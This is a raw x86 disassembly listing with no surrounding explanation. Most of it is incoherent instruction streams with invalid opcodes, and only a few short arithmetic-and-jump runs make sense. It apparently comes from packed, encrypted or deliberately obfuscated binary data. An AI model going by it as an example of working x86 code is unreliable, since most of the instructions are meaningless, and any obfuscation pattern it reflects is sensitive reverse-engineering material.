  411d31:	mov    ?,WORD PTR [ebp-0x7f]
  411d34:	jmp    0x8c83:0x104682de
  411d3b:	inc    edx
  411d3c:	(bad)  
  411d3d:	retf   0xb447
  411d40:	leave  
  411d41:	cmp    BYTE PTR [ebp+eiz*8-0x40d4fb20],ch
  411d48:	inc    ecx
  411d49:	cmp    ebp,DWORD PTR [ebx+0x4f]
  411d4c:	jnp    0x411d29
  411d4e:	(bad)
  411d53:	pop    ebx
  411d54:	adc    ecx,DWORD PTR [ebx-0x372976c]
  411d5a:	push   esp
  411d5b:	mov    bl,BYTE PTR fs:0xe1a5ab9f
  411d62:	xor    bh,bh
  411d64:	addr16 cmp dh,dl
  411d67:	mov    bh,0x26
  411d69:	pop    eax
  411d6a:	cmp    ebp,DWORD PTR [ebx]
  411d6c:	fs mov ebp,0x76c042f3
  411d72:	cmp    eax,0x4e30077e
  411d77:	daa    
  411d78:	stos   DWORD PTR es:[edi],eax
  411d79:	push   esi
  411d7a:	mov    dl,0x98
  411d7c:	mov    ecx,gs
  411d7e:	iret   
  411d7f:	(bad)  
  411d81:	mov    ebp,0x7efd5b50
  411d86:	aas    
  411d87:	test   al,0x21
  411d89:	sub    ebx,DWORD PTR [ebx-0x5dfce65f]
  411d8f:	inc    esi
  411d90:	sub    al,0xd3
  411d92:	dec    ecx
  411d93:	xchg   edi,eax
  411d94:	out    0xa4,eax
  411d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d97:	xlat   BYTE PTR ds:[ebx]
  411d98:	ror    DWORD PTR [edx-0x6a],0x8c
  411d9c:	test   eax,0xd14b4c2c
  411da1:	pop    esi
  411da2:	and    esp,DWORD PTR [eax+ecx*1-0x3ae242c2]
  411da9:	jbe    0x411d64
  411dab:	jl     0x411e15
  411dad:	mov    dh,0xc9
  411daf:	sub    dl,BYTE PTR [edx-0x13]
  411db2:	inc    ebx
  411db3:	sub    eax,0x53d15830
  411db8:	mov    esp,0xdd2f71c3
  411dbd:	les    ebx,FWORD PTR [eax]
  411dbf:	dec    edi
  411dc0:	jge    0x411e27
  411dc2:	mov    dh,0xe1
  411dc4:	mov    edx,0x7218cb21
  411dc9:	push   cs
  411dca:	inc    esp
  411dcb:	cmc    
  411dcc:	fwait
  411dcd:	xor    eax,0x7cf2a4be
  411dd2:	cmp    ebp,DWORD PTR [esi-0x4b]
  411dd5:	adc    BYTE PTR [ebx],al
  411dd7:	xchg   DWORD PTR [edi],edi
  411dd9:	into   
  411dda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ddb:	cmp    ecx,DWORD PTR [edi-0x378be9b4]
  411de1:	aad    0xec
  411de3:	(bad)  
  411de4:	clc    
  411de5:	popf   
  411de6:	push   ecx
  411de7:	mov    esp,0xfab71497
  411dec:	cwde   
  411ded:	aam    0xc8
  411def:	sub    BYTE PTR [ecx+0x461eabc5],ah
  411df5:	mov    es,edi
  411df7:	jno    0x411e06
  411df9:	rol    eax,0xa2
  411dfc:	(bad)  
  411dfd:	adc    al,BYTE PTR [esi+0x54]
  411e00:	xchg   esi,eax
  411e01:	add    eax,0x387e94f0
  411e06:	sbb    edi,DWORD PTR [edi+ecx*4]
  411e09:	imul   esp,DWORD PTR [edx-0x790f7133],0x3f01be62
  411e13:	push   cs
  411e14:	add    dh,ch
  411e16:	jp     0x411df2
  411e18:	adc    al,0xa1
  411e1a:	jbe    0x411e75
  411e1c:	rep ins DWORD PTR es:[edi],dx
  411e1e:	stc    
  411e1f:	pop    es
  411e20:	outs   dx,DWORD PTR ds:[esi]
  411e21:	mov    eax,0xab673b72
  411e26:	push   0x872d20ef
  411e2b:	sti    
  411e2c:	data16 js 0x411e7b
  411e2f:	add    esi,esp
  411e31:	lods   al,BYTE PTR ds:[esi]
  411e32:	push   edx
  411e33:	xchg   BYTE PTR [eax],bl
  411e35:	mov    edi,0x391fbbad
  411e3a:	sub    esp,DWORD PTR [edx-0x20]
  411e3d:	push   ds
  411e3e:	sub    DWORD PTR [eax-0x7a],esi
  411e41:	repnz fisubr WORD PTR [esi]
  411e44:	push   ecx
  411e45:	push   esi
  411e46:	mov    ebp,edx
  411e48:	sub    eax,0xf65dfbc5
  411e4d:	lea    esp,[esi]
  411e4f:	push   ebp
  411e50:	pusha  
  411e51:	adc    ecx,eax
  411e53:	out    dx,eax
  411e54:	mov    al,0x63
  411e56:	mov    ecx,0x7c3f66b2
  411e5b:	add    ebp,ebx
  411e5d:	(bad)  
  411e5f:	loop   0x411e55
  411e61:	dec    edi
  411e62:	not    DWORD PTR [ebx]
  411e64:	fwait
  411e65:	inc    ebp
  411e66:	cmp    cl,BYTE PTR [ebp-0x301858f6]
  411e6c:	xchg   esi,eax
  411e6d:	ins    DWORD PTR es:[edi],dx
  411e6e:	xor    DWORD PTR [ebx-0x147b509e],esp
  411e74:	dec    ebp
  411e75:	mov    al,0xdc
  411e77:	or     eax,0xc99e0667
  411e7c:	ret    
  411e7d:	mov    dl,0xd
  411e7f:	or     BYTE PTR [ebp+0x24],0xc3
  411e83:	loop   0x411ee8
  411e85:	dec    ebx
  411e86:	imul   ecx,DWORD PTR ds:0x840475b7,0x88ee8bd7
  411e90:	and    ch,BYTE PTR [ecx+0xc]
  411e93:	out    0x8b,al
  411e95:	adc    BYTE PTR [esi-0x25],bh
  411e98:	dec    edx
  411e99:	test   al,0xc2
  411e9b:	loope  0x411e26
  411e9d:	cmp    DWORD PTR [ecx+0x3e42dd4c],edx
  411ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ea4:	push   gs
  411ea6:	pop    edx
  411ea7:	rol    BYTE PTR [edx-0x43cc92a0],cl
  411ead:	repz add al,bl
  411eb0:	add    bh,bh
  411eb2:	mov    ds:0xdbd1e3c7,al
  411eb7:	push   es
  411eb8:	out    0xd3,al
  411eba:	and    ah,dl
  411ebc:	add    BYTE PTR [ebx+eax*8-0x64],0xf3
  411ec1:	out    dx,eax
  411ec2:	push   0xffffff92
  411ec4:	pop    es
  411ec5:	retf   
  411ec6:	sub    bh,BYTE PTR [eax]
  411ec8:	daa    
  411ec9:	cmc    
  411eca:	aad    0xf4
  411ecc:	js     0x411e70
  411ece:	push   edi
  411ecf:	das    
  411ed0:	mov    bl,0x26
  411ed2:	cmp    al,0x81
  411ed4:	call   0xf01:0x4b0027e6
  411edb:	loopne 0x411f55
  411edd:	lock mov esp,0xa7c1d7a7
  411ee3:	mov    cl,BYTE PTR [ebx-0x4c]
  411ee6:	and    dh,BYTE PTR ds:0x39b86c9b
  411eec:	pop    ebp
  411eed:	inc    edx
  411eee:	arpl   WORD PTR [ebx-0x5a],dx
  411ef1:	sbb    BYTE PTR [ecx],0x32
  411ef4:	test   BYTE PTR [edx],cl
  411ef6:	xchg   esp,eax
  411ef7:	or     ecx,DWORD PTR [eax]
  411ef9:	adc    eax,0x6563e9b1
  411efe:	sub    bh,BYTE PTR [edi+0x1ff49f09]
  411f04:	mov    eax,0x110c8ab4
  411f09:	mov    edx,DWORD PTR [ebp+0x8]
  411f0c:	mov    BYTE PTR [eax+edx*1],cl
  411f0f:	mov    ecx,DWORD PTR [ebp-0x18]
  411f12:	mov    eax,ds:0x422588
  411f17:	imul   ecx,ecx,0x14cdd575
  411f1d:	xor    ecx,eax
  411f1f:	mov    eax,DWORD PTR [ebp-0x1c]
  411f22:	jmp    0x412220
  411f27:	repnz or BYTE PTR [esi-0x1e],ch
  411f2b:	mov    ah,0xbd
  411f2d:	ja     0x411f48
  411f2f:	add    DWORD PTR [ebp+edx*2+0x31],eax
  411f33:	mov    ch,BYTE PTR [eax-0x9]
  411f36:	das    
  411f37:	packsswb mm7,QWORD PTR [ebx-0x44408645]
  411f3e:	mov    ebx,0x52bc59d3
  411f43:	and    ebp,DWORD PTR [esi-0x3c]
  411f46:	es inc ebp
  411f48:	push   edx
  411f49:	mov    esp,0x7a44b5ee
  411f4e:	fist   DWORD PTR [edx+0x60]
  411f51:	mov    al,0x45
  411f53:	and    eax,0xbb279db3
  411f58:	call   0xdbc0841c
  411f5d:	and    al,0xce
  411f5f:	hlt    
  411f60:	add    BYTE PTR [edi+0x558f8700],cl
  411f66:	mov    ds:0x845db8b0,eax
  411f6b:	jb     0x411f24
  411f6d:	jnp    0x411f0a
  411f6f:	dec    eax
  411f70:	add    cl,BYTE PTR [edx-0x5c]
  411f73:	cmc    
  411f74:	mov    al,ds:0xf7711356
  411f79:	inc    esi
  411f7a:	push   esp
  411f7b:	cdq    
  411f7c:	pushf  
  411f7d:	jmp    0x6a04:0xca0e4d1b
  411f84:	and    BYTE PTR [edx],bl
  411f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f87:	(bad)  
  411f88:	cwde   
  411f89:	in     al,0x1c
  411f8b:	ds cmp eax,0x6077ace0
  411f91:	add    DWORD PTR [esi+eiz*1],ebp
  411f94:	lea    esp,[esp+esi*8+0x1c1e6f9c]
  411f9b:	cdq    
  411f9c:	pop    edx
  411f9d:	into   
  411f9e:	add    di,di
  411fa1:	inc    ebx
  411fa2:	in     eax,0x6b
  411fa4:	scas   al,BYTE PTR es:[edi]
  411fa5:	pop    ebx
  411fa6:	shl    DWORD PTR [eax],0xd9
  411fa9:	sub    eax,0x1e944360
  411fae:	popa   
  411faf:	stos   DWORD PTR es:[edi],eax
  411fb0:	or     al,0x24
  411fb2:	icebp  
  411fb3:	inc    ebx
  411fb4:	and    ebx,edx
  411fb6:	arpl   dx,dx
  411fb8:	mov    esi,0x46543bef
  411fbd:	cwde   
  411fbe:	push   ebp
  411fbf:	or     eax,0x5dcd807d
  411fc4:	cmc    
  411fc5:	mov    ah,BYTE PTR [ecx+esi*1]
  411fc8:	aad    0xa4
  411fca:	dec    esp
  411fcb:	in     eax,0x26
  411fcd:	or     BYTE PTR [ebx],dh
  411fcf:	(bad)  
  411fd0:	fstp   DWORD PTR cs:[ecx+ecx*8+0x6a]
  411fd5:	lds    ecx,FWORD PTR [edi]
  411fd7:	(bad)  
  411fd9:	repz imul edx,DWORD PTR [edx-0x63fb6f36],0x4b175e09
  411fe4:	pop    ds
  411fe5:	cmc    
  411fe6:	cdq    
  411fe7:	sub    eax,0x890c5c58
  411fec:	pop    ds
  411fed:	cmp    DWORD PTR [esi-0x3d1a44dd],esi
  411ff3:	pshufw mm6,QWORD PTR [edx],0xe9
  411ff7:	push   ebp
  411ff8:	dec    ebx
  411ff9:	test   al,0xc7
  411ffb:	fisttp WORD PTR [edi+ebx*1+0x747f82d8]
  412002:	lods   eax,DWORD PTR ds:[esi]
  412003:	sbb    DWORD PTR [edx-0x256e73be],edi
  412009:	loop   0x412018
  41200b:	jl     0x412034
  41200d:	icebp  
  41200e:	mov    ds:0x59eafd0d,eax
  412013:	inc    ecx
  412014:	cmp    DWORD PTR [esi-0xfc1fe55],esp
  41201a:	push   esp
  41201b:	inc    ebx
  41201c:	inc    esp
  41201d:	inc    edx
  41201e:	inc    eax
  41201f:	cs or  eax,0xb2b7830f
  412025:	xor    ebx,DWORD PTR [ebp-0x1573973e]
  41202b:	or     ah,BYTE PTR [edi-0x18]
  41202e:	fidiv  DWORD PTR [edx]
  412030:	adc    dh,BYTE PTR [edi]
  412032:	jle    0x412063
  412034:	daa    
  412035:	ja     0x411fea
  412037:	and    eax,0x21807892
  41203c:	mov    edi,0x3bd53e43
  412041:	cmp    al,0xe
  412044:	pop    bx
  412046:	add    BYTE PTR [esi+0x50bd8113],0xd3
  41204d:	ret    
  41204e:	pop    ebx
  41204f:	inc    edx
  412050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412051:	sub    ebp,DWORD PTR [ebx]
  412053:	or     esp,ebx
  412055:	enter  0x1bc8,0xab
  412059:	xlat   BYTE PTR ds:[ebx]
  41205a:	loopne 0x412036
  41205c:	push   ds
  41205d:	or     eax,0x43c22f5d
  412062:	aad    0x4e
  412064:	lea    esp,[edx+0x3da2ae6a]
  41206a:	inc    ecx
  41206b:	jmp    0xd929202a
  412070:	mov    es,WORD PTR [edx]
  412072:	lds    ebx,FWORD PTR [ebp+0x36]
  412075:	dec    ebp
  412076:	cmp    eax,0xfdcac8b
  41207b:	div    al
  41207d:	or     al,0x60
  41207f:	cmp    al,0x6c
  412081:	xchg   esi,eax
  412082:	push   0x6fa894a1
  412087:	cmp    al,0xcd
  412089:	inc    esp
  41208a:	xor    BYTE PTR [edx+0x225b35c1],bh
  412090:	adc    al,0x68
  412092:	jb     0x41203e
  412094:	mov    dl,BYTE PTR [eax+0x42d156d0]
  41209a:	push   esp
  41209b:	(bad)  
  41209c:	sar    BYTE PTR [ecx+0x10ec2660],1
  4120a2:	cmp    eax,0xea18c6f0
  4120a7:	call   0xb0f0f4aa
  4120ac:	dec    esi
  4120ad:	jnp    0x41206e
  4120af:	js     0x412075
  4120b1:	aad    0x31
  4120b3:	pop    esp
  4120b4:	sub    DWORD PTR [esp+eiz*8+0x58],esi
  4120b8:	jbe    0xc744f2be
  4120be:	mov    edi,0x161926eb
  4120c3:	(bad)  [ebx]
  4120c5:	pusha  
  4120c6:	icebp  
  4120c7:	cmp    DWORD PTR [edx-0x56],0xffffffe3
  4120cb:	mov    al,0x3d
  4120cd:	arpl   WORD PTR ds:0x9e794bb2,di
  4120d3:	mov    al,ds:0x4f48b871
  4120d8:	stc    
  4120d9:	imul   edi,DWORD PTR [eax+ebx*2],0x8d8bc118
  4120e0:	push   es
  4120e1:	pop    edx
  4120e2:	xchg   ebp,eax
  4120e3:	rcr    BYTE PTR [edi],1
  4120e5:	aaa    
  4120e6:	mov    BYTE PTR [esi],bh
  4120e8:	adc    cl,BYTE PTR [eax-0x454ef02b]
  4120ee:	and    cl,BYTE PTR [edx-0x5d083f7]
  4120f4:	fisub  WORD PTR [edx]
  4120f6:	dec    ebp
  4120f7:	add    eax,0xa01b0350
  4120fc:	xlat   BYTE PTR ds:[ebx]
  4120fd:	cmp    al,0x7a
  4120ff:	xchg   ebp,eax
  412100:	arpl   WORD PTR [edx],di
  412102:	ficomp WORD PTR [ebx+0x3b7bc4e6]
  412108:	push   0x74add4a0
  41210d:	lods   eax,DWORD PTR ds:[esi]
  41210e:	inc    ebx
  41210f:	mov    esi,0x779f53cc
  412114:	ds xor al,0x4e
  412117:	repz mov ebx,0x3881fa71
  41211d:	data16 and al,BYTE PTR [ebx+edx*1+0x60]
  412122:	lods   al,BYTE PTR ds:[esi]
  412123:	in     ax,0x9b
  412126:	or     eax,0x69c69f56
  41212b:	sub    al,0x12
  41212d:	ret    
  41212e:	or     ebp,ebp
  412130:	and    al,0xcc
  412132:	cmp    eax,0x1a0656de
  412137:	dec    esp
  412138:	dec    esp
  412139:	push   edx
  41213a:	inc    ebp
  41213b:	popf   
  41213c:	mov    ah,0xd
  41213e:	and    DWORD PTR [ecx+0x65],edi
  412141:	xchg   ebp,eax
  412142:	into   
  412143:	ss repnz ins DWORD PTR es:[edi],dx
  412146:	lds    ecx,FWORD PTR [edi+ebp*8+0x37f2cdc]
  41214d:	mov    bh,0xda
  41214f:	jo     0x41211e
  412151:	outs   dx,DWORD PTR ds:[esi]
  412152:	mov    eax,ds:0xd83c03cd
  412157:	js     0x4120f1
  412159:	out    dx,al
  41215a:	push   esp
  41215b:	mov    eax,0x52550510
  412160:	scas   al,BYTE PTR es:[edi]
  412161:	and    al,0x2
  412163:	scas   al,BYTE PTR es:[edi]
  412164:	pop    edi
  412165:	mov    al,ds:0x7683ed38
  41216a:	push   0xffffffa3
  41216c:	popa   
  41216d:	dec    esi
  41216e:	adc    edi,DWORD PTR [eax-0x31]
  412171:	ret    0xb7f5
  412174:	test   eax,0x165fd48a
  412179:	jo     0x4121ed
  41217b:	and    bl,BYTE PTR [eax+ebp*4-0x5e]
  41217f:	mov    BYTE PTR [eax+0x21],dl
  412182:	jbe    0x412124
  412184:	inc    eax
  412185:	ins    DWORD PTR es:[edi],dx
  412186:	ror    dh,1
  412188:	mov    bh,0xd4
  41218a:	pop    esi
  41218b:	int3   
  41218c:	or     edx,DWORD PTR [edx-0x27af6854]
  412192:	push   ebp
  412193:	sub    al,BYTE PTR [ebx]
  412195:	imul   eax,DWORD PTR [ecx],0x32732843
  41219b:	popf   
  41219c:	and    al,0xfe
  41219e:	jmp    0x9ed9:0x29ca96f4
  4121a5:	(bad)  
  4121a6:	jp     0x41221c
  4121a8:	jle    0x4121bb
  4121aa:	call   0x1ec1cfa6
  4121af:	test   eax,0x63c24ac0
  4121b4:	add    eax,0xedaa8b6d
  4121b9:	pop    ecx
  4121ba:	out    dx,al
  4121bb:	lock shl BYTE PTR [edx+0x24f693a],1
  4121c2:	cwde   
  4121c3:	mov    ds:0xd9648690,eax
  4121c8:	ja     0x412187
  4121ca:	adc    ecx,DWORD PTR [ecx-0x6]
  4121cd:	pop    ebx
  4121ce:	jno    0x412151
  4121d0:	push   ebp
  4121d1:	jnp    0x412250
  4121d3:	sbb    BYTE PTR [ebx],0x2a
  4121d6:	addr16 (bad) 
  4121d8:	or     eax,0x36d690e1
  4121dd:	je     0x4121d5
  4121df:	and    eax,0x6b56b747
  4121e4:	addr16 sbb al,0x8e
  4121e7:	shl    BYTE PTR [eax-0x67],0x7c
  4121eb:	daa    
  4121ec:	imul   ebx,DWORD PTR ds:0x9527a8c5,0xa07c468d
  4121f6:	call   FWORD PTR [ebp+0x74]
  4121f9:	push   edi
  4121fa:	push   edx
  4121fb:	lea    edi,[eax]
  4121fd:	ficom  WORD PTR [ecx+0x65324e98]
  412203:	sub    DWORD PTR [ecx],ecx
  412205:	push   esi
  412206:	and    DWORD PTR [esi-0x4e],ebp
  412209:	popf   
  41220a:	jno    0x4121de
  41220c:	loop   0x4121ab
  41220e:	out    0xb8,al
  412210:	out    0x6b,al
  412212:	mov    ds:0x4e620731,al
  412217:	mov    eax,0xb1b06575
  41221c:	outs   dx,DWORD PTR ds:[esi]
  41221d:	push   eax
  41221e:	mov    ecx,0xc1af0fb8
  412223:	xor    edx,edx
  412225:	mov    ecx,0x219a9fe2
  41222a:	div    ecx
  41222c:	jmp    0x41252a
  412231:	jmp    0x7939:0xb2397a43
  412238:	mov    DWORD PTR [ecx],edi
  41223a:	adc    DWORD PTR [edi+0x5],esi
  41223d:	mov    ecx,0xcc4523b7
  412242:	ins    DWORD PTR es:[edi],dx
  412243:	mov    ebx,0xbbbf79bb
  412248:	mov    ebx,0xb698470
  41224d:	sub    ebx,ebp
  41224f:	fcom   QWORD PTR [eax]
  412251:	sbb    eax,0x643f7607
  412256:	push   ebx
  412257:	push   0x52
  412259:	sbb    DWORD PTR [ebp+0x42c1c742],ebp
  41225f:	cdq    
  412260:	xor    al,BYTE PTR [ecx-0x70fdf063]
  412266:	repz ficomp DWORD PTR [ebx-0x22]
  41226a:	push   ebx
  41226b:	mov    esp,0x85f307f
  412270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412271:	lea    ebp,cs:[eax+ebx*2-0x6f7b9fe1]
  412279:	mov    esi,esi
  41227b:	add    bl,BYTE PTR [eax-0xd656e2c]
  412281:	pusha  
  412282:	xor    eax,0x3d69f78e
  412288:	jo     0x412282
  41228a:	clc    
  41228b:	cmp    DWORD PTR [ebp-0x67e5c1d3],0xffffffa5
  412292:	mov    ds:0xb34246b2,al
  412297:	vpunpckhwd ymm6,ymm7,YMMWORD PTR [ecx-0xc7ade8e]
  41229f:	or     DWORD PTR [ebx+edx*2+0x75c2876d],0x322df366
  4122aa:	add    ah,BYTE PTR [ecx-0x39]
  4122ad:	or     cl,dh
  4122af:	add    DWORD PTR [ecx+0x3c],edx
  4122b2:	arpl   WORD PTR [eax-0x62d7a6e9],si
  4122b8:	div    dl
  4122ba:	ins    BYTE PTR es:[edi],dx
  4122bb:	loope  0x412325
  4122bd:	in     al,0x19
  4122bf:	mov    ah,BYTE PTR [edi-0x7f4e3464]
  4122c5:	test   BYTE PTR [edx-0xe],dl
  4122c8:	out    0x9a,eax
  4122ca:	sub    BYTE PTR [edx],bl
  4122cc:	xlat   BYTE PTR ds:[ebx]
  4122cd:	sbb    ch,bh
  4122cf:	inc    ecx
  4122d0:	add    al,dl
  4122d2:	mov    edx,0x8246f555
  4122d7:	in     al,0x23
  4122d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122da:	cmp    eax,0xa70de64a
  4122df:	dec    esi
  4122e0:	dec    ecx
  4122e1:	imul   edx,DWORD PTR [ebx+edx*1+0x3],0x861edb41
  4122e9:	neg    BYTE PTR [esi-0x68bea377]
  4122ef:	xchg   ebp,eax
  4122f0:	mov    dl,0x8f
  4122f2:	(bad)  
  4122f3:	std    
  4122f4:	jecxz  0x412345
  4122f6:	nop
  4122f7:	(bad)  
  4122f9:	xchg   DWORD PTR [eax-0x526a8ac6],edi
  4122ff:	or     al,0xc7
  412301:	fist   DWORD PTR [eax+0x48113e1d]
  412307:	xor    ebp,DWORD PTR [ebx]
  412309:	mov    ebp,0x4244769a
  41230e:	mov    ah,0x30
  412310:	pusha  
  412311:	mul    ebx
  412313:	shl    BYTE PTR [ecx+ecx*2],cl
  412316:	rol    DWORD PTR [edx+esi*2+0x2ac42fb2],cl
  41231d:	pusha  
  41231e:	stc    
  41231f:	out    dx,al
  412320:	jmp    0x412354
  412322:	jno    0x412378
  412324:	repz xor eax,0x1e28c906
  41232a:	cmp    BYTE PTR [esi+esi*1],0x67
  41232e:	jecxz  0x412330
  412330:	mov    dl,0xba
  412332:	jl     0x41234e
  412334:	and    al,0x8d
  412336:	sbb    al,0xce
  412338:	mov    BYTE PTR [eax+0x39],bh
  41233b:	in     al,0x4b
  41233d:	clc    
  41233e:	xchg   esp,eax
  41233f:	cmp    eax,0x3e2f2cf6
  412344:	mov    ebx,0x1f2b930f
  412349:	xchg   esi,eax
  41234a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41234b:	push   ss
  41234c:	mov    edi,0x2cc127cf
  412351:	out    0x62,eax
  412353:	add    BYTE PTR [ecx+0x5a0ee1ed],dh
  412359:	and    eax,0xfc392594
  41235e:	out    dx,eax
  41235f:	leave  
  412360:	adc    DWORD PTR [edi],eax
  412362:	inc    esi
  412363:	outs   dx,BYTE PTR ds:[esi]
  412364:	test   eax,0x38e70ec8
  412369:	scas   eax,DWORD PTR es:[edi]
  41236a:	les    esi,FWORD PTR [ebx-0x14ffcbc0]
  412370:	fisubr DWORD PTR [edi+0x24]
  412373:	push   cs
  412374:	(bad)  
  412376:	popa   
  412377:	adc    cl,BYTE PTR [edx-0x7e]
  41237a:	jge    0x41235e
  41237c:	stos   DWORD PTR es:[edi],eax
  41237d:	out    0xc7,eax
  41237f:	pop    ecx
  412380:	inc    ecx
  412381:	cmp    eax,0x50165e9
  412386:	push   esp
  412387:	adc    ecx,esi
  412389:	daa    
  41238a:	mov    ds:0x2ec7e021,eax
  41238f:	aam    0x58
  412391:	mov    ebx,0x7b80dd7
  412396:	ss inc esp
  412398:	adc    al,0x67
  41239a:	lods   al,BYTE PTR ds:[esi]
  41239b:	(bad)  
  41239c:	jp     0x41239c
  41239e:	mov    esp,0x97f3c2fd
  4123a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123a4:	outs   dx,BYTE PTR ds:[esi]
  4123a5:	mov    dh,0x93
  4123a7:	cmp    esp,DWORD PTR [eax+0x5]
  4123aa:	sub    BYTE PTR [esi-0x3fc2b495],0x30
  4123b1:	or     BYTE PTR [ecx+eiz*2-0x6a],cl
  4123b5:	and    eax,0x24567878
  4123ba:	jle    0x41238e
  4123bc:	outs   dx,DWORD PTR ds:[esi]
  4123bd:	sbb    DWORD PTR [ebp+0x12],edx
  4123c0:	dec    ebp
  4123c1:	pop    eax
  4123c2:	jmp    0xe918:0x1a7de0c6
  4123c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123ca:	sbb    DWORD PTR [edx-0x3d],edx
  4123cd:	daa    
  4123ce:	xor    ebx,DWORD PTR [esi]
  4123d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123d1:	add    bl,BYTE PTR ss:[ebp-0x60]
  4123d5:	pop    edx
  4123d6:	fiadd  WORD PTR [ebx-0x39]
  4123d9:	xor    edi,DWORD PTR [esi]
  4123db:	ss jnp 0x412378
  4123de:	inc    esp
  4123df:	stos   BYTE PTR es:[edi],al
  4123e0:	ds pop ds
  4123e2:	jne    0x4123f0
  4123e4:	sub    BYTE PTR [ebp+0x4754865f],al
  4123ea:	(bad)  
  4123eb:	shl    DWORD PTR [esi-0x1255bed8],1
  4123f1:	pop    eax
  4123f2:	rep stos BYTE PTR es:[edi],al
  4123f4:	push   eax
  4123f5:	enter  0x2897,0x3f
  4123f9:	push   cs
  4123fa:	cwde   
  4123fb:	and    BYTE PTR [ebx+0x5ecbbfa7],al
  412401:	jno    0x41247e
  412403:	sbb    BYTE PTR [ebp-0x63],al
  412406:	call   0xe3ffd322
  41240b:	sbb    DWORD PTR ds:0x2716f660,ebp
  412411:	das    
  412412:	std    
  412413:	aad    0x8e
  412415:	pushf  
  412416:	leave  
  412417:	fdivr  QWORD PTR [edx-0x1a9db255]
  41241d:	iret   
  41241e:	jmp    FWORD PTR [edx]
  412420:	dec    esi
  412421:	or     bh,BYTE PTR [ebp-0x5f]
  412424:	fnstsw WORD PTR [ecx]
  412426:	jl     0x412456
  412428:	test   BYTE PTR [eax+0x61],al
  41242b:	int    0x9
  41242d:	mov    ds:0x8b91729b,al
  412432:	mov    dh,0xa0
  412434:	jbe    0x412435
  412436:	test   al,0x6f
  412438:	jae    0x4124af
  41243a:	repnz loopne 0x41244d
  41243d:	inc    eax
  41243e:	shl    dl,0xb4
  412441:	cld    
  412442:	push   cs
  412443:	retf   0x25ca
  412446:	or     al,0x15
  412448:	inc    ebx
  412449:	dec    eax
  41244a:	aas    
  41244b:	jecxz  0x412483
  41244d:	xchg   ecx,eax
  41244e:	mov    ecx,0xa55bb4c6
  412453:	outs   dx,DWORD PTR ds:[esi]
  412454:	dec    edi
  412455:	arpl   WORD PTR [ecx],cx
  412457:	out    0x59,eax
  412459:	mov    cl,0xb4
  41245b:	aaa    
  41245c:	aam    0x8a
  41245e:	outs   dx,DWORD PTR ds:[esi]
  41245f:	fmul   DWORD PTR [esp+0x2ddc100a]
  412466:	cmp    ch,dl
  412468:	dec    esi
  412469:	aaa    
  41246a:	push   0xffffffda
  41246c:	out    0x1b,eax
  41246e:	jp     0x41249d
  412470:	and    esp,DWORD PTR [ebx+esi*2-0x7fc5f1bb]
  412477:	pcmpeqb mm7,QWORD PTR [ecx]
  41247a:	cmp    ah,BYTE PTR [ecx+0x35]
  41247d:	ins    BYTE PTR es:[edi],dx
  41247e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41247f:	inc    edx
  412480:	stos   BYTE PTR es:[edi],al
  412481:	ins    DWORD PTR es:[edi],dx
  412482:	adc    eax,0x82b95f43
  412487:	push   eax
  412488:	push   ds
  412489:	test   DWORD PTR [edx-0x1ed65c77],esp
  41248f:	mov    bh,0x87
  412491:	xchg   edx,eax
  412492:	enter  0x1af2,0x20
  412496:	out    dx,eax
  412497:	ds pop esi
  412499:	and    DWORD PTR ds:0x9643ed46,edx
  41249f:	rol    BYTE PTR [ebx-0x1c],cl
  4124a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124a3:	fidiv  DWORD PTR [edi]
  4124a5:	rcl    BYTE PTR [edi+0x767a116d],1
  4124ab:	adc    eax,0x138520f6
  4124b0:	mov    eax,0xe8356cd3
  4124b5:	lods   al,BYTE PTR ds:[esi]
  4124b6:	sbb    ah,BYTE PTR [ecx+0x7d]
  4124b9:	test   eax,0xdbb34d36
  4124be:	jb     0x412514
  4124c0:	rcl    DWORD PTR [edx+0x5b],cl
  4124c3:	(bad)  
  4124c4:	idiv   esi
  4124c6:	mov    al,0x9b
  4124c8:	pop    esp
  4124c9:	xchg   ebp,eax
  4124ca:	cmp    DWORD PTR [eax+0x3c5b7fff],edx
  4124d0:	jmp    0x412512
  4124d2:	dec    ebp
  4124d3:	jecxz  0x41248b
  4124d5:	and    al,0xda
  4124d7:	div    DWORD PTR [edx]
  4124d9:	clc    
  4124da:	mov    ds,WORD PTR [esi]
  4124dc:	int    0x3a
  4124de:	add    dh,BYTE PTR [edi-0xf16c11e]
  4124e4:	push   edx
  4124e5:	enter  0x7d53,0xfe
  4124e9:	jo     0x41251c
  4124eb:	mov    DWORD PTR [esi+edx*4],edx
  4124ee:	fidivr WORD PTR [eax+0x1fa9abc9]
  4124f4:	sub    eax,0xd9c44434
  4124f9:	and    DWORD PTR [esi],esi
  4124fb:	test   al,0x86
  4124fd:	jns    0x4124e6
  4124ff:	mov    eax,ds:0xe583dc7b
  412504:	aam    0xeb
  412506:	mov    eax,ds:0xa258255d
  41250b:	xchg   ecx,eax
  41250c:	push   ebp
  41250d:	out    0x16,al
  41250f:	dec    ecx
  412510:	lea    ebp,[edi-0x1]
  412513:	popf   
  412514:	dec    ecx
  412515:	popa   
  412516:	mov    bl,0x38
  412518:	and    al,ch
  41251a:	sub    eax,0x75611c77
  41251f:	fimul  WORD PTR [eax-0x3b511085]
  412525:	fcom   DWORD PTR [edi+0x55]
  412528:	imul   ecx,DWORD PTR [eax-0x75],0x4d
  41252c:	hlt    
  41252d:	imul   ecx,ecx,0x645d46e
  412533:	xor    ecx,0x1584
  412539:	xor    edx,edx
  41253b:	push   0x3
  41253d:	add    DWORD PTR [ebp-0x4],eax
  412540:	mov    eax,ds:0x42257c
  412545:	or     ecx,eax
  412547:	mov    eax,0x8eefbff5
  41254c:	div    ecx
  41254e:	mov    ecx,DWORD PTR [ebp+0x10]
  412551:	xor    edx,edx
  412553:	sub    ecx,eax
